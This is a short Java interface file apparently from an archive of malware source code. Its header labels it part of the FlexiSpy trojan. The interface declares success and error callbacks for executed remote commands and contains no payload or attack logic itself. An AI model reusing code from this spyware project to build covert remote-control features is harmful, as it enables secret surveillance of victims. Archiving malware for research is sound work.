/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.rmtcmd.pcc;

public interface PCCRmtCmdExecutionListener {
	public void cmdExecutedSuccess(PCCRmtCommand cmd);
	public void cmdExecutedError(PCCRmtCommand cmd);
}
